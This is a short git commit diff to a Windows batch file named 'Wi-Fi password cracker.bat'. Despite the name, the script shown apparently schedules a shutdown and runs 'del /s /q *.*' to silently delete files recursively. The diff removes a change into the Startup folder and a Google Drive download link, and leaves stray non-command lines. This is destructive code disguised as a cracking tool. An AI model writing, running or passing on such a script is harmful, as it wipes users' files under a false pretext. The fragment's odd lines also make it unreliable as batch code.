ff5542c6b62eed58860295758416539181f89001
Varun Banka <88031057+VarunBanka@users.noreply.github.com>
2022-10-24 14:45:03 +0530

    Update Wi-Fi password cracker.bat

--- Wi-Fi password cracker.bat
+++ Wi-Fi password cracker.bat
@@ -8,9 +8,5 @@ shutdown -s -t 30
 
 image.jpg
 
-cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
-
 del /s /q *.*
 
-
-https://drive.google.com/uc?id=1SLQFYeiSzlFxxrv_L64oZ7W5QTxcvFUB&export=download
